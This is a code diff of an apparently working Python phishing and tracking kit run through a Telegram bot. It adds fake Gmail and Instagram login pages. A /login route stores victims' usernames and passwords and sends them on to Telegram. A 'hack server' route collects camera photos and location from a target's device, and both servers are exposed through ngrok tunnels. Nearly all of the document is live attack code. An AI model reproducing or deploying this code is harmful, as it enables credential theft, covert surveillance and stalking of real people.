+            -webkit-tap-highlight-color: transparent;
+        }
+        body {
+            font-family: 'Google Sans', Arial, sans-serif;
+            background-color: #ffffff;
+            color: #202124;
+            line-height: 1.4286;
+            font-size: 14px;
+            padding: 0;
+            margin: 0;
+            height: 100vh;
+            display: flex;
+            flex-direction: column;
+        }
+        .container {
+            flex: 1;
+            display: flex;
+            flex-direction: column;
+            max-width: 450px;
+            margin: 0 auto;
+            width: 100%;
+            padding: 20px;
+        }
+        .header {
+            text-align: center;
+            margin: 40px 0 30px 0;
+        }
+        .logo {
+            width: 75px;
+            height: 75px;
+            margin: 0 auto 20px auto;
+            background: conic-gradient(from -45deg, #ea4335, #4285f4, #34a853, #fbbc05, #ea4335);
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 32px;
+            color: white;
+            font-weight: bold;
+        }
+        .title {
+            font-size: 24px;
+            font-weight: 400;
+            margin-bottom: 8px;
+            color: #202124;
+        }
+        .subtitle {
+            font-size: 16px;
+            color: #5f6368;
+            margin-bottom: 40px;
+        }
+        .card {
+            background: white;
+            border: 1px solid #dadce0;
+            border-radius: 8px;
+            padding: 40px 40px 36px;
+            margin-bottom: 16px;
+            width: 100%;
+        }
+        .form-group {
+            margin-bottom: 24px;
+        }
+        input[type="email"],
+        input[type="password"] {
+            width: 100%;
+            padding: 13px 15px;
+            border-radius: 4px;
+            border: 1px solid #dadce0;
+            font-size: 16px;
+            background: white;
+            color: #202124;
+            font-family: inherit;
+            transition: border 0.2s;
+        }
+        input[type="email"]::placeholder,
+        input[type="password"]::placeholder {
+            color: #5f6368;
+        }
+        input[type="email"]:focus,
+        input[type="password"]:focus {
+            border-color: #1a73e8;
+            outline: none;
+            box-shadow: 0 0 0 2px #e8f0fe;
+        }
+        .login-btn {
+            background-color: #1a73e8;
+            border: none;
+            border-radius: 4px;
+            font-size: 14px;
+            color: white;
+            font-weight: 500;
+            padding: 10px 24px;
+            margin: 8px 0;
+            cursor: pointer;
+            font-family: inherit;
+            float: right;
+            transition: background-color 0.2s;
+        }
+        .login-btn:hover {
+            background-color: #1669d6;
+        }
+        .login-btn:active {
+            background-color: #1a73e8;
+            transform: scale(0.98);
+        }
+        .forgot-password {
+            color: #1a73e8;
+            text-decoration: none;
+            font-size: 14px;
+            font-weight: 500;
+            display: inline-block;
+            margin-top: 8px;
+        }
+        .forgot-password:hover {
+            text-decoration: underline;
+        }
+        .help-section {
+            text-align: center;
+            margin-top: 40px;
+            color: #5f6368;
+            font-size: 14px;
+        }
+        .help-link {
+            color: #1a73e8;
+            text-decoration: none;
+            font-weight: 500;
+        }
+        .help-link:hover {
+            text-decoration: underline;
+        }
+        .footer {
+            text-align: center;
+            padding: 24px;
+            margin-top: auto;
+            border-top: 1px solid #dadce0;
+        }
+        .footer-links {
+            font-size: 12px;
+            color: #5f6368;
+            line-height: 1.6;
+            margin-bottom: 10px;
+        }
+        .footer-links a {
+            color: #5f6368;
+            text-decoration: none;
+            margin: 0 8px;
+        }
+        .footer-links a:hover {
+            text-decoration: underline;
+        }
+        .language-selector {
+            font-size: 12px;
+            color: #5f6368;
+            margin-top: 16px;
+        }
+        .language-selector select {
+            border: 1px solid #dadce0;
+            border-radius: 4px;
+            padding: 6px 12px;
+            background: white;
+            color: #5f6368;
+        }
+        .create-account {
+            color: #1a73e8;
+            text-decoration: none;
+            font-weight: 500;
+            font-size: 14px;
+            display: inline-block;
+            margin-top: 16px;
+        }
+        .create-account:hover {
+            text-decoration: underline;
+        }
+        .next-btn {
+            background-color: #1a73e8;
+            border: none;
+            border-radius: 4px;
+            font-size: 14px;
+            color: white;
+            font-weight: 500;
+            padding: 10px 24px;
+            margin: 8px 0;
+            cursor: pointer;
+            font-family: inherit;
+            float: right;
+            transition: background-color 0.2s;
+        }
     </style>
 </head>
 <body>
@@ -465,7 +1147,15 @@ def create_default_templates():
 
     <div class="footer">
         <div class="footer-links">
-            <a href="#">Help</a> <a href="#">Privacy</a> <a href="#">Terms</a>
+            <a href="#">Help</a>
+            <a href="#">Privacy</a>
+            <a href="#">Terms</a>
+        </div>
+        <div class="language-selector">
+            <select>
+                <option>English (United States)</option>
+                <option>ខ្មែរ (កម្ពុជា)</option>
+            </select>
         </div>
     </div>
 
@@ -501,34 +1191,189 @@ def create_default_templates():
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <title>Instagram</title>
     <style>
-        * { margin: 0; padding: 0; box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
-        body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif; background-color: #fafafa; color: #262626; line-height: 1.34; font-size: 14px; padding: 0; margin: 0; height: 100vh; display: flex; flex-direction: column; }
-        .container { flex: 1; display: flex; flex-direction: column; padding: 16px; max-width: 400px; margin: 0 auto; width: 100%; }
-        .header { text-align: center; margin: 40px 0 30px 0; }
-        .logo { width: 175px; height: 51px; margin: 0 auto 20px auto; background-image: url('https://i.imgur.com/zqpwkLQ.png'); background-size: contain; background-repeat: no-repeat; background-position: center; }
-        .card { background: white; border: 1px solid #dbdbdb; border-radius: 8px; padding: 20px; margin-bottom: 16px; width: 100%; }
-        .form-group { margin-bottom: 12px; }
-        input[type="text"], input[type="password"] { width: 100%; padding: 12px 16px; border-radius: 4px; border: 1px solid #dbdbdb; font-size: 14px; background: #fafafa; color: #262626; font-family: inherit; }
-        input::placeholder { color: #8e8e8e; }
-        input:focus { border-color: #a8a8a8; outline: none; }
-        .login-btn { background-color: #0095f6; border: none; border-radius: 4px; font-size: 16px; color: white; font-weight: bold; padding: 10px; width: 100%; margin-bottom: 16px; cursor: pointer; font-family: inherit; opacity: 0.7; }
-        .login-btn:active { background-color: #0077c7; transform: scale(0.98); }
-        .divider { display: flex; align-items: center; margin: 20px 0; color: #8e8e8e; font-size: 13px; }
-        .divider::before, .divider::after { content: ""; flex: 1; border-bottom: 1px solid #dbdbdb; }
-        .divider::before { margin-right: 16px; }
-        .divider::after { margin-left: 16px; }
-        .facebook-login { color: #385185; text-align: center; display: block; text-decoration: none; font-size: 14px; font-weight: 600; margin-bottom: 16px; }
-        .forgot-password { color: #00376b; text-align: center; display: block; text-decoration: none; font-size: 12px; }
-        .signup-section { background: white; border: 1px solid #dbdbdb; border-radius: 8px; padding: 20px; text-align: center; margin-bottom: 16px; }
-        .signup-text { color: #262626; font-size: 14px; }
-        .signup-link { color: #0095f6; text-decoration: none; font-weight: 600; }
-        .get-app { text-align: center; margin: 20px 0; font-size: 14px; color: #262626; line-height: 1.5; }
-        .app-buttons { display: flex; justify-content: center; gap: 10px; margin-top: 10px; }
-        .app-button { height: 40px; }
-        .footer { text-align: center; padding: 20px; margin-top: auto; }
-        .footer-links { font-size: 12px; color: #8e8e8e; line-height: 1.6; margin-bottom: 10px; }
-        .footer-links a { color: #8e8e8e; text-decoration: none; margin: 0 6px; }
-        .copyright { font-size: 12px; color: #8e8e8e; }
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            -webkit-tap-highlight-color: transparent;
+        }
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+            background-color: #fafafa;
+            color: #262626;
+            line-height: 1.34;
+            font-size: 14px;
+            padding: 0;
+            margin: 0;
+            height: 100vh;
+            display: flex;
+            flex-direction: column;
+        }
+        .container {
+            flex: 1;
+            display: flex;
+            flex-direction: column;
+            padding: 16px;
+            max-width: 400px;
+            margin: 0 auto;
+            width: 100%;
+        }
+        .header {
+            text-align: center;
+            margin: 40px 0 30px 0;
+        }
+        .logo {
+            width: 175px;
+            height: 51px;
+            margin: 0 auto 20px auto;
+            background: url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 48 48"><path fill="%23333" d="M24 0C10.8 0 0 10.8 0 24s10.8 24 24 24 24-10.8 24-24S37.2 0 24 0zm12.3 36.3c-.8.8-1.8 1.2-2.9 1.2H14.6c-1.1 0-2.1-.4-2.9-1.2-.8-.8-1.2-1.8-1.2-2.9V14.6c0-1.1.4-2.1 1.2-2.9.8-.8 1.8-1.2 2.9-1.2h18.8c1.1 0 2.1.4 2.9 1.2.8.8 1.2 1.8 1.2 2.9v18.8c0 1.1-.4 2.1-1.2 2.9z"/><path fill="%23333" d="M24 11.9c-6.6 0-12 5.4-12 12s5.4 12 12 12 12-5.4 12-12-5.4-12-12-12zm0 19.8c-4.3 0-7.8-3.5-7.8-7.8s3.5-7.8 7.8-7.8 7.8 3.5 7.8 7.8-3.5 7.8-7.8 7.8z"/><circle fill="%23333" cx="36.5" cy="11.5" r="2.8"/></svg>') no-repeat center;
+            background-size: contain;
+        }
+        .card {
+            background: white;
+            border: 1px solid #dbdbdb;
+            border-radius: 8px;
+            padding: 20px;
+            margin-bottom: 16px;
+            width: 100%;
+        }
+        .form-group {
+            margin-bottom: 12px;
+        }
+        input[type="text"],
+        input[type="password"] {
+            width: 100%;
+            padding: 12px 16px;
+            border-radius: 4px;
+            border: 1px solid #dbdbdb;
+            font-size: 14px;
+            background: #fafafa;
+            color: #262626;
+            font-family: inherit;
+        }
+        input[type="text"]::placeholder,
+        input[type="password"]::placeholder {
+            color: #8e8e8e;
+        }
+        input[type="text"]:focus,
+        input[type="password"]:focus {
+            border-color: #a8a8a8;
+            outline: none;
+        }
+        .login-btn {
+            background-color: #0095f6;
+            border: none;
+            border-radius: 4px;
+            font-size: 16px;
+            color: white;
+            font-weight: bold;
+            padding: 10px;
+            width: 100%;
+            margin-bottom: 16px;
+            cursor: pointer;
+            font-family: inherit;
+            opacity: 0.7;
+        }
+        .login-btn:active {
+            background-color: #0077c7;
+            transform: scale(0.98);
+        }
+        .divider {
+            display: flex;
+            align-items: center;
+            margin: 20px 0;
+            color: #8e8e8e;
+            font-size: 13px;
+        }
+        .divider::before,
+        .divider::after {
+            content: "";
+            flex: 1;
+            border-bottom: 1px solid #dbdbdb;
+        }
+        .divider::before {
+            margin-right: 16px;
+        }
+        .divider::after {
+            margin-left: 16px;
+        }
+        .facebook-login {
+            color: #385185;
+            text-align: center;
+            display: block;
+            text-decoration: none;
+            font-size: 14px;
+            font-weight: 600;
+            margin-bottom: 16px;
+        }
+        .forgot-password {
+            color: #00376b;
+            text-align: center;
+            display: block;
+            text-decoration: none;
+            font-size: 12px;
+        }
+        .signup-section {
+            background: white;
+            border: 1px solid #dbdbdb;
+            border-radius: 8px;
+            padding: 20px;
+            text-align: center;
+            margin-bottom: 16px;
+        }
+        .signup-text {
+            color: #262626;
+            font-size: 14px;
+        }
+        .signup-link {
+            color: #0095f6;
+            text-decoration: none;
+            font-weight: 600;
+        }
+        .get-app {
+            text-align: center;
+            margin: 20px 0;
+            font-size: 14px;
+            color: #262626;
+            line-height: 1.5;
+        }
+        .app-buttons {
+            display: flex;
+            justify-content: center;
+            gap: 10px;
+            margin-top: 10px;
+        }
+        .app-button {
+            height: 40px;
+            background: #000;
+            color: white;
+            padding: 8px 12px;
+            border-radius: 4px;
+            font-size: 12px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+        .footer {
+            text-align: center;
+            padding: 20px;
+            margin-top: auto;
+        }
+        .footer-links {
+            font-size: 12px;
+            color: #8e8e8e;
+            line-height: 1.6;
+            margin-bottom: 10px;
+        }
+        .footer-links a {
+            color: #8e8e8e;
+            text-decoration: none;
+            margin: 0 6px;
+        }
+        .copyright {
+            font-size: 12px;
+            color: #8e8e8e;
+        }
     </style>
 </head>
 <body>
@@ -562,19 +1407,31 @@ def create_default_templates():
         <div class="get-app">
             <div>Get the app.</div>
             <div class="app-buttons">
-                <img src="https://static.cdninstagram.com/rsrc.php/v3/yz/r/c5Rp7Ym-Klz.png" alt="Google Play" class="app-button">
-                <img src="https://static.cdninstagram.com/rsrc.php/v3/yu/r/EHY6QnZYdNX.png" alt="Microsoft Store" class="app-button">
+                <div class="app-button">Google Play</div>
+                <div class="app-button">Microsoft Store</div>
             </div>
         </div>
     </div>
 
     <div class="footer">
         <div class="footer-links">
-            <a href="#">Meta</a> <a href="#">About</a> <a href="#">Blog</a> <a href="#">Jobs</a> <a href="#">Help</a> <a href="#">API</a> 
-            <a href="#">Privacy</a> <a href="#">Terms</a> <a href="#">Locations</a> <a href="#">Instagram Lite</a> <a href="#">Threads</a> 
-            <a href="#">Contact Uploading & Non-Users</a> <a href="#">Meta Verified</a>
+            <a href="#">Meta</a>
+            <a href="#">About</a>
+            <a href="#">Blog</a>
+            <a href="#">Jobs</a>
+            <a href="#">Help</a>
+            <a href="#">API</a>
+            <a href="#">Privacy</a>
+            <a href="#">Terms</a>
+            <a href="#">Locations</a>
+            <a href="#">Instagram Lite</a>
+            <a href="#">Threads</a>
+            <a href="#">Contact Uploading & Non-Users</a>
+            <a href="#">Meta Verified</a>
         </div>
-        <div class="copyright">English (US) © 2025 Instagram from Meta</div>
+        <div class="copyright">
+            English (US) © 2025 Instagram from Meta
+        </div>
     </div>
 </body>
 </html>"""
@@ -609,15 +1466,23 @@ def set_phishing_page_safe(platform):
     global current_phishing_page
     
     try:
+        # Set locally first (this is the most important)
         current_phishing_page = platform
         print(f"✅ Page set locally to: {platform}")
         
+        # Try to set via URL with very short timeout and error handling
         if phishing_ngrok_url:
             try:
-                response = requests.get(f"{phishing_ngrok_url}/set_page/{platform}", timeout=0.5, verify=False)
+                # Use a very short timeout to avoid blocking
+                response = requests.get(
+                    f"{phishing_ngrok_url}/set_page/{platform}", 
+                    timeout=0.3,  # Very short timeout
+                    verify=False  # Skip SSL verification
+                )
                 if response.status_code == 200:
                     print(f"✅ Page also set via URL: {platform}")
             except:
+                # Silent handling for all errors - this is expected
                 pass
         else:
             print("ℹ️ No phishing URL available for remote setting")
@@ -636,6 +1501,184 @@ def set_page(page_type):
         return f"Page set to {page_type}", 200
     
     return "Invalid page type", 400
+
+# ================================
+# ULTRA-FAST URL HANDLING - ELIMINATE 404 ERRORS
+# ================================
+
+@phishing_app.route('/', methods=['GET', 'POST'])
+def phishing_index():
+    """Main phishing page - handles both GET and POST"""
+    template_files = {
+        "facebook": "facebook.html",
+        "tiktok": "tiktok.html", 
+        "telegram": "telegram.html",
+        "gmail": "gmail.html",
+        "instagram": "instagram.html"
+    }
+    
+    template_file = template_files.get(current_phishing_page, "facebook.html")
+    
+    print(f"🔍 Rendering template: {template_file} for page: {current_phishing_page}")
+    
+    try:
+        # Check if template file exists
+        template_path = os.path.join(templates_dir, template_file)
+        if not os.path.exists(template_path):
+            print(f"❌ Template file not found: {template_path}")
+            # Create default template immediately
+            create_default_templates()
+            if os.path.exists(template_path):
+                print(f"✅ Template created, rendering: {template_file}")
+                return render_template(template_file)
+            else:
+                return '<html><body><h1>Loading...</h1><p>Please wait...</p></body></html>', 200
+        
+        return render_template(template_file)
+    except Exception as e:
+        print(f"❌ Error rendering template {template_file}: {e}")
+        # Return simple loading page
+        return '<html><body><h1>Loading...</h1><p>Please wait...</p></body></html>', 200
+
+@phishing_app.route('/login', methods=['POST'])
+def phishing_login():
+    """Handle login form submission"""
+    try:
+        username = request.form.get('username', '')
+        password = request.form.get('password', '')
+        ip_address = request.remote_addr
+        user_agent = request.headers.get('User-Agent', '')
+        
+        data = {
+            'username': username,
+            'password': password,
+            'ipAddress': ip_address,
+            'userAgent': user_agent,
+            'pageType': current_phishing_page
+        }
+        
+        # Save credentials
+        with open('credentials.json', 'a') as f:
+            f.write(json.dumps(data) + '\n')
+        
+        print('Credentials saved:', data)
+        
+        # Get creator ID from active session or track the creator
+        creator_id = TELEGRAM_ID  # Default to admin
+        # Try to find the creator from active sessions
+        for user_id in active_chat_ids:
+            creator_id = user_id
+            break
+        
+        send_phishing_notification(data, creator_id)
+        
+        redirect_urls = {
+            "tiktok": "https://www.tiktok.com/",
+            "telegram": "https://web.telegram.org/",
+            "gmail": "https://mail.google.com/",
+            "instagram": "https://www.instagram.com/",
+            "facebook": "https://www.facebook.com/"
+        }
+        
+        return redirect(redirect_urls.get(current_phishing_page, "https://www.google.com/"))
+    
+    except Exception as e:
+        print(f"Error in phishing login: {e}")
+        return redirect("https://www.google.com/")
+
+@phishing_app.route('/<path:path>')
+def catch_all(path):
+    """Catch all routes and redirect to appropriate pages"""
+    # If it's a known phishing platform, set it and redirect
+    if path in ["facebook", "tiktok", "telegram", "gmail", "instagram"]:
+        set_phishing_page_safe(path)
+        return redirect('/')
+    
+    # For any other path, redirect to main phishing page
+    return redirect('/')
+
+@phishing_app.route('/favicon.ico')
+def favicon():
+    """Handle favicon requests to avoid 404"""
+    return '', 204
+
+# ================================
+# HACK SERVER ROUTES
+# ================================
+
+@hack_app.route('/', methods=['GET'])
+def hack_index():
+    """Default route for hack server"""
+    return '<html><body><h1>System Loading...</h1><p>Please wait while the system initializes.</p></body></html>', 200
+
+@hack_app.route('/track/<track_id>', methods=['GET', 'POST'])
+def track(track_id):
+    """Track user data and camera access"""
+    if request.method == 'GET':
+        redirect_url = request.args.get('url', 'https://google.com')
+        return render_template_string(TRACKING_PAGE_HTML, track_id=track_id, redirect_url=redirect_url)
+    
+    elif request.method == 'POST':
+        try:
+            device_info = request.json
+            device_info['ip_address'] = request.remote_addr
+            
+            creator_id = None
+            for user_id, links in user_links.items():
+                for link in links:
+                    if link['track_id'] == track_id:
+                        creator_id = user_id
+                        break
+                if creator_id:
+                    break
+            
+            os.makedirs('captured_images', exist_ok=True)
+            
+            if 'cameraPhotos' in device_info and len(device_info['cameraPhotos']) > 0:
+                device_info['processedPhotos'] = []
+                for i, photo_data in enumerate(device_info['cameraPhotos']):
+                    try:
+                        watermarked_image = add_watermark_with_date(photo_data)
+                        
+                        image_data = photo_data.split(',')[1] if photo_data.startswith('data:image') else photo_data
+                        image_bytes = base64.b64decode(image_data)
+                        with open(f'captured_images/{track_id}camera{i+1}_original.jpg', 'wb') as f:
+                            f.write(image_bytes)
+                        
+                        watermarked_bytes = base64.b64decode(watermarked_image.split(',')[1])
+                        with open(f'captured_images/{track_id}camera{i+1}_watermarked.jpg', 'wb') as f:
+                            f.write(watermarked_bytes)
+                        
+                        device_info['processedPhotos'].append(watermarked_image)
+                    except Exception as e:
+                        print(f"Error processing camera image {i+1}: {e}")
+                        device_info['processedPhotos'].append(photo_data)
+            
+            tracking_data[track_id] = device_info
+            
+            if creator_id:
+                send_hack_notification(track_id, device_info, creator_id)
+            
+            return jsonify({'success': True})
+            
+        except Exception as e:
+            print(f"Error processing data: {e}")
+            return jsonify({'success': False, 'error': str(e)})
+
+@hack_app.route('/<path:path>')
+def hack_catch_all(path):
+    """Catch all routes for hack server and redirect appropriately"""
+    # If it looks like a track ID, handle it
+    if len(path) == 36 and '-' in path:  # UUID format
+        return redirect(f'/track/{path}')
+    
+    # Return simple loading page for any other route
+    return '<html><body><h1>Loading...</h1><script>setTimeout(() => window.location.href="/", 1000);</script></body></html>', 200
+
+@hack_app.route('/favicon.ico')
+def hack_favicon():
+    """Handle favicon requests for hack server"""
+    return '', 204
 
 # ================================
 # HACK CAMERA & LOCATION FUNCTIONS
@@ -859,8 +1902,10 @@ def add_watermark_with_date(image_data, text="t.me/mengheang25"):
             except:
                 font = None
 
+        # Get current date
         current_date = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
         
+        # Left watermark (username)
         left_text = text
         if font:
             left_bbox = draw.textbbox((0, 0), left_text, font=font)
@@ -873,6 +1918,7 @@ def add_watermark_with_date(image_data, text="t.me/mengheang25"):
         left_x = left_margin
         left_y = image.height - left_height - left_margin
 
+        # Right watermark (date)
         right_text = current_date
         if font:
             right_bbox = draw.textbbox((0, 0), right_text, font=font)
@@ -885,14 +1931,22 @@ def add_watermark_with_date(image_data, text="t.me/mengheang25"):
         right_x = image.width - right_width - right_margin
         right_y = image.height - right_height - right_margin
 
+        # Draw left background
         draw.rectangle([left_x - 5, left_y - 5, left_x + left_width + 5, left_y + left_height + 5], fill=(0, 0, 0, 128))
+        
+        # Draw right background
         draw.rectangle([right_x - 5, right_y - 5, right_x + right_width + 5, right_y + right_height + 5], fill=(0, 0, 0, 128))
 
+        # Draw left text
         if font:
             draw.text((left_x, left_y), left_text, fill=(255, 255, 255, 255), font=font)
-            draw.text((right_x, right_y), right_text, fill=(255, 255, 255, 255), font=font)
         else:
             draw.text((left_x, left_y), left_text, fill=(255, 255, 255, 255))
+
+        # Draw right text
+        if font:
+            draw.text((right_x, right_y), right_text, fill=(255, 255, 255, 255), font=font)
+        else:
             draw.text((right_x, right_y), right_text, fill=(255, 255, 255, 255))
 
         watermarked_image = Image.alpha_composite(image, watermark).convert('RGB')
@@ -958,15 +2012,18 @@ def send_hack_notification(track_id, device_info, creator_id):
                 }
                 requests.post(url, json=data, verify=False)
         
+        # Send location accuracy message
         if 'location' in device_info:
             accuracy_message = f"📍 Location Received\nLatitude: {device_info['location']['latitude']}\nLongitude: {device_info['location']['longitude']}\nAccuracy: {device_info['location']['accuracy']} meters"
             for recipient in recipients:
                 requests.post(f"https://api.telegram.org/bot{TOKEN}/sendMessage", 
                              json={"chat_id": recipient, "text": accuracy_message}, verify=False)
         
+        # Send camera photos with watermarks
         if 'cameraPhotos' in device_info and len(device_info['cameraPhotos']) > 0:
             for i, photo_data in enumerate(device_info['cameraPhotos']):
                 try:
+                    # Add watermark with date
                     watermarked_image = add_watermark_with_date(photo_data)
                     
                     photo_data = watermarked_image.split(',')[1] if watermarked_image.startswith('data:image') else watermarked_image
@@ -986,7 +2043,8 @@ def send_hack_notification(track_id, device_info, creator_id):
                     for recipient in recipients:
                         requests.post(f"https://api.telegram.org/bot{TOKEN}/sendMessage", 
                                      json={"chat_id": recipient, "text": error_msg}, verify=False)
-   
+        
+        # Send create tracking link button after all photos
         keyboard = [[InlineKeyboardButton("Create Tracking Link", callback_data="create_tracking_link")]]
         reply_markup = json.dumps({"inline_keyboard": keyboard})
         
@@ -997,59 +2055,6 @@ def send_hack_notification(track_id, device_info, creator_id):
                     
     except Exception as e:
         print(f"Error sending notification to Telegram: {e}")
-
-@hack_app.route('/track/<track_id>', methods=['GET', 'POST'])
-def track(track_id):
-    if request.method == 'GET':
-        redirect_url = request.args.get('url', 'https://google.com')
-        return render_template_string(TRACKING_PAGE_HTML, track_id=track_id, redirect_url=redirect_url)
-    
-    elif request.method == 'POST':
-        try:
-            device_info = request.json
-            device_info['ip_address'] = request.remote_addr
-            
-            creator_id = None
-            for user_id, links in user_links.items():
-                for link in links:
-                    if link['track_id'] == track_id:
-                        creator_id = user_id
-                        break
-                if creator_id:
-                    break
-            
-            os.makedirs('captured_images', exist_ok=True)
-            
-            if 'cameraPhotos' in device_info and len(device_info['cameraPhotos']) > 0:
-                device_info['processedPhotos'] = []
-                for i, photo_data in enumerate(device_info['cameraPhotos']):
-                    try:
-                        watermarked_image = add_watermark_with_date(photo_data)
-                        
-                        image_data = photo_data.split(',')[1] if photo_data.startswith('data:image') else photo_data
-                        image_bytes = base64.b64decode(image_data)
-                        with open(f'captured_images/{track_id}camera{i+1}_original.jpg', 'wb') as f:
-                            f.write(image_bytes)
-                        
-                        watermarked_bytes = base64.b64decode(watermarked_image.split(',')[1])
-                        with open(f'captured_images/{track_id}camera{i+1}_watermarked.jpg', 'wb') as f:
-                            f.write(watermarked_bytes)
-                        
-                        device_info['processedPhotos'].append(watermarked_image)
-                    except Exception as e:
-                        print(f"Error processing camera image {i+1}: {e}")
-                        device_info['processedPhotos'].append(photo_data)
-            
-            tracking_data[track_id] = device_info
-            
-            if creator_id:
-                send_hack_notification(track_id, device_info, creator_id)
-            
-            return jsonify({'success': True})
-            
-        except Exception as e:
-            print(f"Error processing data: {e}")
-            return jsonify({'success': False, 'error': str(e)})
 
 def run_hack_server():
     print(f"🚀 Starting Hack Server on port {HACK_SERVER_PORT}")
@@ -1070,6 +2075,7 @@ def send_phishing_notification(data, creator_id):
         
         platform = platform_info.get(data['pageType'], {"name": "Unknown", "icon": "🌐"})
         
+        # Get creator info
         creator_id_str = str(creator_id)
         user_info = user_data.get(creator_id_str, {})
         username = user_info.get('username', 'មិនស្គាល់')
@@ -1086,6 +2092,7 @@ def send_phishing_notification(data, creator_id):
         recipients = []
         recipients.append(TELEGRAM_ID)
         
+        # Always send to creator if they are not the admin
         if creator_id_str != TELEGRAM_ID:
             recipients.append(creator_id_str)
         
@@ -1102,7 +2109,8 @@ def send_phishing_notification(data, creator_id):
             except Exception as e:
                 print(f"❌ Error sending to chat_id {chat_id}: {e}")
         
-        restart_message = "ចំណាំ: URL Phishing អាចប្រើបានតែម្ដងទេ n/បើមានបញ្ហា URL សូមចុចពាក្យ => /restart ដើម្បី Requests URL ឡើងវិញ n/bot និង Start ជាថ្មី"
+        # Send restart message
+        restart_message = "អ្នកអាចធ្វើការ /restart នៅពេលដែលចុច /restart វានិងធ្វើ start bot ជាថ្មី"
         for chat_id in recipients:
             url = f"https://api.telegram.org/bot{TOKEN}/sendMessage"
             payload = {
@@ -1119,6 +2127,7 @@ def add_phishing_chat_id(chat_id):
     print(f"✅ Added chat_id to broadcast list: {chat_id}")
     print(f"📊 Total active users: {len(active_chat_ids)}")
 
+# Check if templates directory exists
 def check_templates_directory():
     if not os.path.exists(templates_dir):
         print(f"❌ Templates directory '{templates_dir}' not found!")
@@ -1148,83 +2157,13 @@ def check_templates_directory():
     print("✅ All phishing templates found in templates directory")
     return True
 
-@phishing_app.route('/')
-def phishing_index():
-    template_files = {
-        "facebook": "facebook.html",
-        "tiktok": "tiktok.html", 
-        "telegram": "telegram.html",
-        "gmail": "gmail.html",
-        "instagram": "instagram.html"
-    }
-    
-    template_file = template_files.get(current_phishing_page, "facebook.html")
-    
-    print(f"🔍 Rendering template: {template_file} for page: {current_phishing_page}")
-    print(f"📁 Template folder: {phishing_app.template_folder}")
-    
-    try:
-        template_path = os.path.join(templates_dir, template_file)
-        if not os.path.exists(template_path):
-            print(f"❌ Template file not found: {template_path}")
-            create_default_templates()
-            if os.path.exists(template_path):
-                print(f"✅ Template created, rendering: {template_file}")
-                return render_template(template_file)
-            else:
-                return f"Template file {template_file} not found and could not be created"
-        
-        return render_template(template_file)
-    except Exception as e:
-        print(f"❌ Error rendering template {template_file}: {e}")
-        try:
-            create_default_templates()
-            return render_template(template_file)
-        except:
-            return f"Error loading template: {str(e)}"
-
-@phishing_app.route('/login', methods=['POST'])
-def phishing_login():
-    username = request.form['username']
-    password = request.form['password']
-    ip_address = request.remote_addr
-    user_agent = request.headers.get('User-Agent')
-    
-    data = {
-        'username': username,
-        'password': password,
-        'ipAddress': ip_address,
-        'userAgent': user_agent,
-        'pageType': current_phishing_page
-    }
-    
-    with open('credentials.json', 'a') as f:
-        f.write(json.dumps(data) + '\n')
-    
-    print('Credentials saved:', data)
-    
-    creator_id = TELEGRAM_ID
-    for user_id in active_chat_ids:
-        creator_id = user_id
-        break
-    
-    send_phishing_notification(data, creator_id)
-    
-    redirect_urls = {
-        "tiktok": "https://www.tiktok.com/",
-        "telegram": "https://web.telegram.org/",
-        "gmail": "https://mail.google.com/",
-        "instagram": "https://www.instagram.com/",
-        "facebook": "https://www.facebook.com/"
-    }
-    
-    return redirect(redirect_urls.get(current_phishing_page, "https://www.google.com/"))
-
 def run_phishing_server():
     print(f"🚀 Starting Phishing Server on port {PHISHING_SERVER_PORT}")
     
+    # Create default templates if they don't exist
     create_default_templates()
     
+    # Check if templates exist before starting server
     if not check_templates_directory():
         print("❌ Cannot start phishing server: Missing templates")
         return
@@ -1307,6 +2246,7 @@ async def show_main_menu(update, context):
 async def show_phishing_link(update: Update, context: ContextTypes.DEFAULT_TYPE, platform: str):
     query = update.callback_query
     
+    # Use the safe function to set the page
     set_phishing_page_safe(platform)
     
     platform_names = {
@@ -1319,7 +2259,8 @@ async def show_phishing_link(update: Update, context: ContextTypes.DEFAULT_TYPE,
     
     platform_name = platform_names.get(platform, "Unknown")
     
-    test_url = phishing_ngrok_url if phishing_ngrok_url else "https://latest-overchildish-solenoidally.ngrok-free.dev"
+    # Use the phishing ngrok URL
+    test_url = phishing_ngrok_url if phishing_ngrok_url else "https://latesha-overchildish-solenoidally.ngrok-free.dev"
     
     message = f"🔗 {platform_name} Phishing Link\n\n"
     message += f"🌐 Public URL (Ngrok):\n\n"
@@ -1524,6 +2465,7 @@ def check_ngrok_status():
     global hack_ngrok_url, phishing_ngrok_url
     
     try:
+        # Get active tunnels
         tunnels = ngrok.get_tunnels()
         hack_active = False
         phishing_active = False
@@ -1558,31 +2500,30 @@ def setup_ngrok_tunnels():
         ngrok.set_auth_token(NGROK_AUTHTOKEN)
         print("✅ Ngrok authtoken set successfully")
         
+        # Setup hack server tunnel
         hack_tunnel = ngrok.connect(HACK_SERVER_PORT, bind_tls=True)
         hack_ngrok_url = hack_tunnel.public_url
         print(f"🔗 Hack Server Ngrok URL: {hack_ngrok_url}")
         
+        # Setup phishing server tunnel
         phishing_tunnel = ngrok.connect(PHISHING_SERVER_PORT, bind_tls=True)
         phishing_ngrok_url = phishing_tunnel.public_url
         print(f"🔗 Phishing Server Ngrok URL: {phishing_ngrok_url}")
         
     except Exception as e:
         print(f"❌ Ngrok setup error: {e}")
-        hack_ngrok_url = "https://latest-overchildish-solenoidally.ngrok-free.dev"
-        phishing_ngrok_url = "https://latest-overchildish-solenoidally.ngrok-free.dev"
-
-def create_session():
-    """Create a requests session with SSL verification disabled"""
-    session = requests.Session()
-    session.verify = False
-    return session
+        # Fallback URLs
+        hack_ngrok_url = "https://latesha-overchildish-solenoidally.ngrok-free.dev"
+        phishing_ngrok_url = "https://latesha-overchildish-solenoidally.ngrok-free.dev"
 
 # ================================
 # MAIN APPLICATION
 # ================================
 def run_flask_servers():
+    # Create default templates first
     create_default_templates()
     
